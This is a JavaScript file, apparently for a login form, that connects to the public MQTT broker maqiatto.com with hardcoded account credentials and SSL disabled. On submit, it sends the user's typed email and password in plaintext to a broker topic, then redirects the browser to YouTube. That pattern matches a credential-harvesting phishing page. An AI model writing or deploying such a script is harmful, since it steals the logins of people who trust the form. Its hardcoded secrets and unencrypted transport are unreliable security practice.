//Sent Data
function send() {
  var validate = /^[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/;
  let email = document.getElementById("email").value;
  let password = document.getElementById("password").value;
  if(validate.test(document.getElementById("email").value) == true & password != 0){
    message = new Paho.MQTT.Message("email:"+email+" password:"+password);
    message.destinationName = "web.jhonatanlamina@gmail.com/t1";
    client.send(message);
    window.open("https://www.youtube.com", "_self");
  }else{
    alert("Correo Electronico o Contraseña Incorrectas")
    document.getElementById("f1").reset();
  }
}
//Create a client instance
client = new Paho.MQTT.Client("maqiatto.com", 8883, "web_" + parseInt(Math.random() * 100, 10));
//Set callback handlers
client.onConnectionLost = onConnectionLost;
client.onMessageArrived = onMessageArrived;
var options = {
  useSSL: false,
  userName: "web.jhonatanlamina@gmail.com",
  password: "jhonatanlamina",
  onSuccess:onConnect,
  onFailure:doFail
}
//Connect the client
client.connect(options);
//Called when the client connects
function onConnect() {
  // Once a connection has been made, make a subscription and send a message.
  console.log("Successful Connection");
  client.subscribe("web.jhonatanlamina@gmail.com/t2");
  message = new Paho.MQTT.Message("New Connection");
  message.destinationName = "web.jhonatanlamina@gmail.com/t1";
  client.send(message);
}
function doFail(e){
  console.log(e);
  document.getElementById("enter").value="No Disponible";
  document.getElementById("enter").disabled="true";
}
//Called when the client loses its connection
function onConnectionLost(responseObject) {
  if (responseObject.errorCode != 0) {
    console.log("Connection Lost:"+responseObject.errorMessage);
    document.getElementById("enter").value="No Disponible";
    document.getElementById("enter").disabled="true";
  }
}
//Called when a message arrives
function onMessageArrived(message) {
  console.log("New data received: "+message.payloadString);
  alert(message.payloadString);
}